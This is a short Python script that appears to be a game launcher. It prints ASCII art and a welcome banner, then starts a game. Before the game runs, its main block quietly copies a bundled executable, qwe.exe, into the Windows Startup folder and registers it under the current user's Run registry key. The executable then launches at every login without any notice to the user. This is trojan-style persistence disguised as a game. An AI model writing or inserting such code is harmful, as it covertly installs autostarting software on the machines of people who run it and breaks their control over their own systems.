# This is a sample Python script.
from game import Game
import winreg
import os

text = """
⢀⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆ 
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠁⠸⣼⡿ 
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉⠀⠀⠀⠀⠀ 
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠛⠉


"""

data = """
 ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄     ▄▀▄▄▄▄   ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄▄▄      ▄▀▀▀█▀▀▄  ▄▀▀▀▀▄       ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▄▀▀▀▄      ▄▀▀▀▀▄    ▄▀▀█▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄▄▄ 
█   █    ▐  █ ▐  ▄▀   ▐ █    █     █ █    ▌ █      █ █  █ ▀  █ ▐  ▄▀   ▐     █    █  ▐ █      █     █      █ █   █    █ █   █   █     █         ▐ ▄▀ ▀▄ █  █ ▀  █ ▐  ▄▀   ▐ 
▐  █        █   █▄▄▄▄▄  ▐    █     ▐ █      █      █ ▐  █    █   █▄▄▄▄▄      ▐   █     █      █     █      █ ▐  █    █  ▐  █▀▀█▀      █    ▀▄▄    █▄▄▄█ ▐  █    █   █▄▄▄▄▄  
  █   ▄    █    █    ▌      █        █      ▀▄    ▄▀   █    █    █    ▌         █      ▀▄    ▄▀     ▀▄    ▄▀   █    █    ▄▀    █      █     █ █  ▄▀   █   █    █    █    ▌  
   ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄     ▄▀▄▄▄▄▄▄▀ ▄▀▄▄▄▄▀   ▀▀▀▀   ▄▀   ▄▀    ▄▀▄▄▄▄        ▄▀         ▀▀▀▀         ▀▀▀▀      ▀▄▄▄▄▀  █     █       ▐▀▄▄▄▄▀ ▐ █   ▄▀  ▄▀   ▄▀    ▄▀▄▄▄▄   
         ▀     █    ▐     █        █     ▐           █    █     █    ▐       █                                          ▐     ▐       ▐         ▐   ▐   █    █     █    ▐   
               ▐          ▐        ▐                 ▐    ▐     ▐            ▐                                                                          ▐    ▐     ▐        
"""


def reg_presist(REG_PATH, key, value):
  reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,REG_PATH,0, winreg.KEY_SET_VALUE)
  with reg_key:
    if(value is None):
      winreg.DeleteValue(reg_key, key)
    else:
      if('%' in value):
        var_type = winreg.REG_EXPAND_SZ
      else:
        var_type = winreg.REG_SZ
      winreg.SetValueEx(reg_key, key, 0, var_type, value)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    Thisfile = "C:\\Users\\sanya\\PycharmProjects\\pythonProject3\\qwe.exe"  # Полный путь к файлу, включая название и расширение
    Thisfile_name = os.path.basename("qwe.exe")  # Название файла без пути
    user_path = os.path.expanduser('~')  # Путь к папке пользователя

    if not os.path.exists(
            f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(
            f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
    reg_presist(r'Software\Microsoft\Windows\CurrentVersion\Run', 'Script', os.path.abspath('qwe.exe'))
    print(text)
    print(data)
    game = Game()
    game.start_game()



# See PyCharm help at https://www.jetbrains.com/help/pycharm/
